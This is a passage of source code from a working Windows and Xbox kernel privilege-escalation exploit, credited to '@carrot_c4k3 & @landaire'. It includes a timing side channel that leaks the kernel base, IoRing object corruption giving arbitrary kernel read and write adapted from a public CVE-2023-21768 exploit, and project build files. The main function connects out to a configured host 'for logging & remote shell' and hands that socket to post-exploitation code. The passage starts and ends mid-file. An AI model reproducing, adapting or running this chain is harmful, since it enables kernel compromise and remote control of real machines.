#define KERNEL_UPPER_BOUND 0xfffff81000000000ull
#define ADDR_COUNT ((KERNEL_UPPER_BOUND - KERNEL_LOWER_BOUND) / STEP)

typedef struct _MEM_RANGE {
    UINT64 addr;
    UINT64 count;
} MEM_RANGE;

void bad_syscall();
UINT64 sidechannel(PVOID ptr);

MEM_RANGE* g_ranges_ptr;
UINT32 g_ranges_count;

VOID dump_timings(const char* output_file, PUINT32 timings)
{
    HANDLE h_file = CreateFileA(output_file, GENERIC_WRITE,          // open for writing
        0,                      // do not share
        NULL,                   // default security
        CREATE_NEW,             // create new file only
        FILE_ATTRIBUTE_NORMAL,  // normal file
        NULL);

    DWORD bytes_written = 0;

    // write out the consts
    UINT32 f_step = STEP;
    UINT32 f_iterations = ITERATIONS;
    UINT32 f_dummy_iterations = DUMMY_ITERATIONS;
    UINT32 f_addr_count = ADDR_COUNT;
    UINT64 f_start_addr = KERNEL_LOWER_BOUND;
    // Uncomment to re-enable dumping timings to disc
    WriteFile(h_file, &f_step, sizeof(f_step), &bytes_written, 0);
    WriteFile(h_file, &f_iterations, sizeof(f_iterations), &bytes_written, 0);
    WriteFile(h_file, &f_dummy_iterations, sizeof(f_dummy_iterations), &bytes_written, 0);
    WriteFile(h_file, &f_addr_count, sizeof(f_addr_count), &bytes_written, 0);
    WriteFile(h_file, &f_start_addr, sizeof(f_start_addr), &bytes_written, 0);
    WriteFile(h_file, timings, (ADDR_COUNT * ITERATIONS) * sizeof(UINT32), &bytes_written, 0);
    

    FlushFileBuffers(h_file);
    CloseHandle(h_file);
}

UINT64 do_sidechannel(/*SHELLCODE_CTX* ctx, const char* dump_path*/)
{
    CHAR dump_path[0x200] = { 0 };
    ExpandEnvironmentStringsA("%LOCALAPPDATA%\\..\\LocalState\\timings.bin", dump_path, sizeof(dump_path));

    HANDLE h_heap = GetProcessHeap();
    PUINT32 timings = HeapAlloc(h_heap, 0, (ADDR_COUNT * ITERATIONS) * sizeof(UINT32));
    PUINT32 avgs = HeapAlloc(h_heap, 0, ADDR_COUNT * sizeof(UINT32));
    MEM_RANGE* ranges = HeapAlloc(h_heap, 0, sizeof(MEM_RANGE) * 0x400);
    UINT32 ranges_count = 0;
    UINT64 avg_total = 0;
    UINT64 threshold = 0;
    for (UINT64 i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++) {
        UINT64 x = 0;
        UINT64 addr = KERNEL_LOWER_BOUND;
        while (x < ADDR_COUNT)
        {
            UINT64 addr = KERNEL_LOWER_BOUND + (x * STEP);
            UINT64 res = sidechannel(addr);
            if (i >= DUMMY_ITERATIONS) {
                timings[(x * ITERATIONS) + (i - DUMMY_ITERATIONS)] = res;
            }
            x++;
        }
    }

    //dump_timings(dump_path, timings);

    // take avgs
    for (UINT64 x = 0; x < ADDR_COUNT; x++)
    {
        UINT64 avg = 0;
        for (UINT64 i = 0; i < ITERATIONS; i++)
        {
            avg += timings[(x * ITERATIONS) + i];
        }
        avg /= ITERATIONS;
        avgs[x] = avg;
    }

    // account for anomalies on boundaries
    for (UINT64 x = 0; x < ADDR_COUNT; x++)
    {
        UINT64 addr = KERNEL_LOWER_BOUND + (x * STEP);
        if (addr % 0x2000000 == 0)
        {
            if (x + 1 < ADDR_COUNT) {
                avgs[x] = avgs[x + 1];
            }
            else {
                avgs[x] = avgs[x - 1];
            }
        }
        avg_total += avgs[x];
    }

    avg_total /= ADDR_COUNT;
    threshold = avg_total + (avg_total / 3);

    UINT64 cur_range = 0;
    UINT64 cur_range_len = 0;
    for (UINT64 i = 0; i < ADDR_COUNT; i++)
    {
        UINT32 cur_timing = avgs[i];
        if (cur_timing > threshold) {
            if (cur_range) {
                cur_range_len++;
            }
            else {
                cur_range = i;
                cur_range_len = 1;
            }
        }
        else {
            if (cur_range) {
                if (cur_range_len > 4) {
                    ranges[ranges_count].addr = KERNEL_LOWER_BOUND + ((i - cur_range_len) * STEP);
                    ranges[ranges_count].count = cur_range_len;
                    ranges_count++;
                }

                cur_range_len = 0;
            }
        }
    }

    HeapFree(h_heap, 0, timings);
    HeapFree(h_heap, 0, avgs);
    g_ranges_ptr = ranges;
    g_ranges_count = ranges_count;

    UINT64 kernel_base = 0;

    for (int i = 0; i < ranges_count; i++) {
        UINT64 cur_addr = ranges[i].addr;
        UINT64 cur_count = ranges[i].count;

        if (cur_count > 80 && cur_count < 120) {
            kernel_base = cur_addr - 0x600000;
            break;
        }
    }

    return kernel_base;
}

int main(int argc, char** argv)
{
    DWORD bytes_written = 0;
    UINT64 ioring_addr = 0;
    ULONG build_rev = 0;
	CHAR path[0x400] = { 0 };
    CHAR ptr_msg[0x400] = { 0 };
    CHAR* cur_msg = NULL;
	CHAR* file_part = NULL;

    // Connect to the host for logging & remote shell
    int start = WSAStartup(MAKEWORD(2, 2), &wsaData);
    winSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sockAddr.sin_family = AF_INET;
    sockAddr.sin_port = htons(port);
    sockAddr.sin_addr.s_addr = inet_addr(GLOBAL_INFO->ip_addr);
    WSAConnect(winSock, (SOCKADDR*)&sockAddr, sizeof(sockAddr), NULL, NULL, NULL, NULL);

    // Write our banner message
    cur_msg = "Collateral Damage - @carrot_c4k3 & @landaire (exploits.forsale)\n";
    send(winSock, cur_msg, strlen(cur_msg), 0);

    // Get and print the build number
    ULONG ret_len = 0;
    SYSTEM_BUILD_VERSION_INFORMATION build_version = { 0 };
    ULONG layer = 0;
    NtQuerySystemInformationEx(SystemBuildVersionInformation, &layer, sizeof(layer), &build_version, sizeof(build_version), &ret_len);
    sprintf_s(ptr_msg, sizeof(ptr_msg), "Build number: %i.%i\n", build_version.NtBuildNumber, build_version.NtBuildQfe);
    send(winSock, ptr_msg, strlen(ptr_msg), 0);

    // Check that the build is supported
    if (build_version.NtBuildNumber == 25398)
    {
        if (build_version.NtBuildQfe == 4478)
        {
            build_rev = 4478;
        }
        else if (build_version.NtBuildQfe == 4908 || build_version.NtBuildQfe == 4909)
        {
            // offsets are the same for 4908 and 4909
            build_rev = 4908;
        }
    }
    else if (build_version.NtBuildNumber == 22621 && build_version.NtBuildQfe == 2864)
    {
        // 10.0.22621.2864
        build_rev = 2864;
    }

    if (build_rev == 0)
    {
        cur_msg = "Unsupported build! Aborting.\n";
        send(winSock, cur_msg, strlen(cur_msg), 0);
        exit(0);
    }

    set_build_rev(build_rev);

    // Attempt to leak the kernel address
    cur_msg = "Attempting to find kernel base...\n";
    send(winSock, cur_msg, strlen(cur_msg), 0);
    FlushFileBuffers(winSock);
    UINT64 nt_base = do_sidechannel();
    g_kernel_base = nt_base;

    // If it fails bail and tell the user to reboot
    if (nt_base == 0)
    {
        cur_msg = "Failed to find kernel base! Reboot your console and try again.\n";
        send(winSock, cur_msg, strlen(cur_msg), 0);
        exit(0);
        return 0;
    }

    // Log the kernel base we leaked
    sprintf_s(ptr_msg, sizeof(ptr_msg), "Found likely kernel base: %p\n", nt_base);
    send(winSock, ptr_msg, strlen(ptr_msg), 0);
    
    // Do the first part of the exploit: corrupting SeMediumDaclSd
    cur_msg = "Attempting exploit...\n";
    send(winSock, cur_msg, strlen(cur_msg), 0);
    do_exploit();

    // If we succeeded the system EPROC should be non-null
    if (ullSystemEPROCaddr == 0)
    {
        cur_msg = "Exploit failed! Reboot your console and try again.\n";
        send(winSock, cur_msg, strlen(cur_msg), 0);
        exit(0);
        return 0;
    }

    /*
     * Critical part of the exploit has succeeded.
     * At this point we are still "Low IL" and can call the WinRT Notification / Toast API.
     * After ioring_lpe2 has executed, the PackageIdentitiy is lost and the WinRT API would fail.
     */
    cur_msg = "Showing toast!\n";
    send(winSock, cur_msg, strlen(cur_msg), 0);
    //show_toast();
    show_toast_rare_achievement(L"Collateral Damage", L"achieved", L"Enjoy!", NULL);

    // Setup the IO ring
    ioring_addr = 0;
    int res = ioring_setup(&ioring_addr);
    if (res != 0)
    {
        sprintf_s(ptr_msg, sizeof(ptr_msg), "IO Ring setup failed. Result: %i\nReboot your console and try again.\n", res);
        send(winSock, ptr_msg, strlen(ptr_msg), 0);
    }

    // Corrupt the IO ring object
    do_write(ioring_addr + 0x9D);

    // Get kernel RW & elevate our process, then fix up SeMediumDaclSd
    ioring_lpe2(GetCurrentProcessId(), 0x65007500, 0x1000, ioring_addr, g_kernel_base);
    cur_msg = "Exploit succeeded! Running payload!\n\n";
    send(winSock, cur_msg, strlen(cur_msg), 0);

    // Run our post-exploitation code
    post_exploit(winSock);

	return 0;
}

```

`collat_payload/collat_payload.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="collat_payload.c" />
    <ClCompile Include="ioring_lpe.c" />
    <ClCompile Include="nt_offsets.c" />
    <ClCompile Include="post_exploit.c" />
    <ClCompile Include="winrt.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="ioring.h" />
    <ClInclude Include="nt_offsets.h" />
    <ClInclude Include="post_exploit.h" />
    <ClInclude Include="Windows.Xbox.UI.Internal.ToastNotifications.h" />
    <ClInclude Include="win_defs.h" />
    <ClInclude Include="winrt.h" />
  </ItemGroup>
  <ItemGroup>
    <MASM Include="prefetch_asm.asm" />
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>17.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{c8172e40-5d40-417a-a6a4-e233c0d1ac12}</ProjectGuid>
    <RootNamespace>collatpayload</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.22621.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.props" />
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_WINSOCKAPI_;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <ErrorReporting>None</ErrorReporting>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalDependencies>onecoreuap.lib;$(SolutionDir)ntdll.lib</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.targets" />
  </ImportGroup>
</Project>

```

`collat_payload/collat_payload.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="collat_payload.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ioring_lpe.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="post_exploit.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="nt_offsets.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="winrt.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="win_defs.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ioring.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="nt_offsets.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="post_exploit.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="winrt.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Windows.Xbox.UI.Internal.ToastNotifications.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <MASM Include="prefetch_asm.asm">
      <Filter>Source Files</Filter>
    </MASM>
  </ItemGroup>
</Project>
```

`collat_payload/ioring.h`:

```h
#ifndef _IORING_H_
#define _IORING_H_

#include "win_defs.h"

typedef struct _NT_IORING_CREATE_FLAGS
{
    enum _NT_IORING_CREATE_REQUIRED_FLAGS Required;
    enum _NT_IORING_CREATE_ADVISORY_FLAGS Advisory;
} NT_IORING_CREATE_FLAGS, * PNT_IORING_CREATE_FLAGS;

typedef struct _NT_IORING_INFO
{
    enum IORING_VERSION IoRingVersion;
    struct _NT_IORING_CREATE_FLAGS Flags;
    unsigned int SubmissionQueueSize;
    unsigned int SubmissionQueueRingMask;
    unsigned int CompletionQueueSize;
    unsigned int CompletionQueueRingMask;
    struct _NT_IORING_SUBMISSION_QUEUE* SubmissionQueue;
    struct _NT_IORING_COMPLETION_QUEUE* CompletionQueue;
} NT_IORING_INFO, * PNT_IORING_INFO;

typedef struct _IOP_MC_BUFFER_ENTRY
{
    USHORT Type;
    USHORT Reserved;
    ULONG Size;
    ULONG ReferenceCount;
    ULONG Flags;
    LIST_ENTRY GlobalDataLink;
    PVOID Address;
    ULONG Length;
    CHAR AccessMode;
    ULONG MdlRef;
    struct _MDL* Mdl;
    KEVENT MdlRundownEvent;
    PULONG64 PfnArray;
    BYTE PageNodes[0x20];
} IOP_MC_BUFFER_ENTRY, * PIOP_MC_BUFFER_ENTRY;

typedef struct _IORING_OBJECT
{
    short Type;
    short Size;
    struct _NT_IORING_INFO UserInfo;
    void* Section;
    struct _NT_IORING_SUBMISSION_QUEUE* SubmissionQueue;
    struct _MDL* CompletionQueueMdl;
    struct _NT_IORING_COMPLETION_QUEUE* CompletionQueue;
    unsigned __int64 ViewSize;
    long InSubmit;
    unsigned __int64 CompletionLock;
    unsigned __int64 SubmitCount;
    unsigned __int64 CompletionCount;
    unsigned __int64 CompletionWaitUntil;
    struct _KEVENT CompletionEvent;
    unsigned char SignalCompletionEvent;
    struct _KEVENT* CompletionUserEvent;
    unsigned int RegBuffersCount;
    struct _IOP_MC_BUFFER_ENTRY** RegBuffers;
    unsigned int RegFilesCount;
    void** RegFiles;
} IORING_OBJECT, * PIORING_OBJECT;

typedef struct _HIORING
{
    HANDLE handle;
    NT_IORING_INFO Info;
    ULONG IoRingKernelAcceptedVersion;
    PVOID RegBufferArray;
    ULONG BufferArraySize;
    PVOID Unknown;
    ULONG FileHandlesCount;
    ULONG SubQueueHead;
    ULONG SubQueueTail;
}_HIORING;

int ioring_setup(PIORING_OBJECT* ppIoRingAddr);
void kwrite(UINT64 addr, PVOID data, SIZE_T size);
int ioring_lpe2(ULONG pid, ULONG64 ullFakeRegBufferAddr, DWORD dwFakeRegBufferCnt, UINT64 ioring_addr, UINT64 nt_base);
int map_region();
int race_succeeded(ULONG ulFakeRegBufferCnt, UINT64 ioring_addr);

#endif
```

`collat_payload/ioring_lpe.c`:

```c
//
// chompie's ioring_lpe.c (https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768/blob/master/Windows_AFD_LPE_CVE-2023-21768/ioring_lpe.c)
// plus a bunch of messy changes for this scenario~
//
#include <windows.h>
#include <ioringapi.h>
#include <winternl.h>
#include <ntstatus.h>
#include <stdio.h>

#include "ioring.h"
#include "win_defs.h"
#include "nt_offsets.h"

HIORING hIoRing = NULL;
PIORING_OBJECT pIoRing = NULL;
HANDLE hInPipe = INVALID_HANDLE_VALUE;
HANDLE hOutPipe = INVALID_HANDLE_VALUE;
HANDLE hInPipeClient = INVALID_HANDLE_VALUE;
HANDLE hOutPipeClient = INVALID_HANDLE_VALUE;


int ioring_setup(PIORING_OBJECT* ppIoRingAddr)
{
    int ret = -1;
    IORING_CREATE_FLAGS ioRingFlags = { 0 };
    CHAR in_path[0x400] = { 0 };
    CHAR out_path[0x400] = { 0 };
    ExpandEnvironmentStringsA("%LOCALAPPDATA%\\..\\LocalState\\in_file.bin", in_path, sizeof(in_path));
    ExpandEnvironmentStringsA("%LOCALAPPDATA%\\..\\LocalState\\out_file.bin", out_path, sizeof(out_path));

    ioRingFlags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;
    ioRingFlags.Advisory = IORING_CREATE_REQUIRED_FLAGS_NONE;

    ret = CreateIoRing(IORING_VERSION_3, ioRingFlags, 0x10000, 0x20000, &hIoRing);

    if (0 != ret)
    {
        goto done;
    }

    ret = getobjptr(ppIoRingAddr, GetCurrentProcessId(), *(PHANDLE)hIoRing);

    if (0 != ret)
    {
        goto done;
    }

    pIoRing = *ppIoRingAddr;

    hInPipe = CreateFileA(in_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    hOutPipe = CreateFileA(out_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if ((INVALID_HANDLE_VALUE == hInPipe) || (INVALID_HANDLE_VALUE == hOutPipe))
    {
        ret = GetLastError();
        goto done;
    }

    hInPipeClient = CreateFileA(in_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    hOutPipeClient = CreateFileA(out_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if ((INVALID_HANDLE_VALUE == hInPipeClient) || (INVALID_HANDLE_VALUE == hOutPipeClient))
    {
        ret = GetLastError();
        goto done;
    }

    ret = 0;

done:
    return ret;
}

int getobjptr(PULONG64 ppObjAddr, ULONG ulPid, HANDLE handle)
{
    int ret = -1;
    PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;
    ULONG ulBytes = 0;
    NTSTATUS ntStatus = STATUS_SUCCESS;

    while ((ntStatus = NtQuerySystemInformation(SystemHandleInformation, pHandleInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH)
    {
        if (pHandleInfo != NULL)
        {
            pHandleInfo = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pHandleInfo, 2 * ulBytes);
        }

        else
        {
            pHandleInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes);
        }
    }

    if (ntStatus != STATUS_SUCCESS)
    {
        ret = ntStatus;
        goto done;
    }

    for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++)
    {
        if ((pHandleInfo->Handles[i].UniqueProcessId == ulPid) && (pHandleInfo->Handles[i].HandleValue == handle))
        {
            *ppObjAddr = pHandleInfo->Handles[i].Object;
            ret = 0;
            break;
        }
    }

done:
    if (NULL != pHandleInfo)
    {
        HeapFree(GetProcessHeap(), 0, pHandleInfo);
    }
    return ret;
}

int ioring_read(PULONG64 pRegisterBuffers, ULONG64 pReadAddr, PVOID pReadBuffer, ULONG ulReadLen)
{
    int ret = -1;
    PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;
    IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(hOutPipeClient);
    IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
    IORING_CQE cqe = { 0 };

    pMcBufferEntry = VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);

    if (NULL == pMcBufferEntry)
    {
        ret = GetLastError();
        goto done;
    }

    pMcBufferEntry->Address = pReadAddr;
    pMcBufferEntry->Length = ulReadLen;
    pMcBufferEntry->Type = 0xc02;
    pMcBufferEntry->Size = 0x80;
    pMcBufferEntry->AccessMode = 1;
    pMcBufferEntry->ReferenceCount = 1;

    pRegisterBuffers[0] = pMcBufferEntry;

    ret = BuildIoRingWriteFile(hIoRing, reqFile, reqBuffer, ulReadLen, 0, FILE_WRITE_FLAGS_NONE, NULL, IOSQE_FLAGS_NONE);

    if (0 != ret)
    {
        goto done;
    }

    ret = SubmitIoRing(hIoRing, 0, 0, NULL);

    if (0 != ret)
    {
        goto done;
    }

    ret = PopIoRingCompletion(hIoRing, &cqe);

    if (0 != ret)
    {
        goto done;
    }

    if (0 != cqe.ResultCode)
    {
        ret = cqe.ResultCode;
        goto done;
    }

    if (0 == ReadFile(hOutPipe, pReadBuffer, ulReadLen, NULL, NULL))
    {
        ret = GetLastError();
        goto done;
    }

    ret = 0;

done:
    if (NULL != pMcBufferEntry)
    {
        VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
    }
    return ret;
}

int ioring_write(PULONG64 pRegisterBuffers, ULONG64 pWriteAddr, PVOID pWriteBuffer, ULONG ulWriteLen)
{
    int ret = -1;
    PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;
    IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(hInPipeClient);
    IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
    IORING_CQE cqe = { 0 };
    CHAR dbg_msg[0x200];


    //sprintf(dbg_msg, "ioring_write: %p %p %i\n", pWriteAddr, pWriteBuffer, ulWriteLen);
    //OutputDebugStringA(dbg_msg);
    //DebugBreak();
    SetFilePointer(hInPipe, 0, NULL, FILE_BEGIN);
    if (0 == WriteFile(hInPipe, pWriteBuffer, ulWriteLen, NULL, NULL))
    {
        ret = GetLastError();
        goto done;
    }
    FlushFileBuffers(hInPipe);
    SetFilePointer(hInPipe, 0, NULL, FILE_BEGIN);

    pMcBufferEntry = VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);

    if (NULL == pMcBufferEntry)
    {
        ret = GetLastError();
        goto done;
    }

    pMcBufferEntry->Address = pWriteAddr;
    pMcBufferEntry->Length = ulWriteLen;
    pMcBufferEntry->Type = 0xc02;
    pMcBufferEntry->Size = 0x80;
    pMcBufferEntry->AccessMode = 1;
    pMcBufferEntry->ReferenceCount = 1;

    pRegisterBuffers[0] = pMcBufferEntry;

    SetFilePointer(hInPipeClient, 0, NULL, FILE_BEGIN);
    ret = BuildIoRingReadFile(hIoRing, reqFile, reqBuffer, ulWriteLen, 0, NULL, IOSQE_FLAGS_NONE);

    if (0 != ret)
    {
        goto done;
    }

    ret = SubmitIoRing(hIoRing, 0, 0, NULL);

    if (0 != ret)
    {
        goto done;
    }

    ret = PopIoRingCompletion(hIoRing, &cqe);

    if (0 != ret)
    {
        goto done;
    }

    if (0 != cqe.ResultCode)
    {
        ret = cqe.ResultCode;
        goto done;
    }

    ret = 0;

done:
    if (NULL != pMcBufferEntry)
    {
        VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
    }
    return ret;
}

int map_region()
{
    PVOID pFakeRegBuffers = VirtualAlloc(0x65000000, 0x100000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    //printf("mapped addr: %p\n", pFakeRegBuffers);

    if (pFakeRegBuffers != (PVOID)0x65000000)
    {
        //printf("failed to map buffer!\n");
        return 0;
    }

    return 1;
}

int race_succeeded(ULONG ulFakeRegBufferCnt, UINT64 ioring_addr)
{
    _HIORING* phIoRing = NULL;

    PVOID pFakeRegBuffers = 0x65007500;


    memset(pFakeRegBuffers, 0, sizeof(ULONG64) * 0x1000);

    phIoRing = *(_HIORING**)&hIoRing;
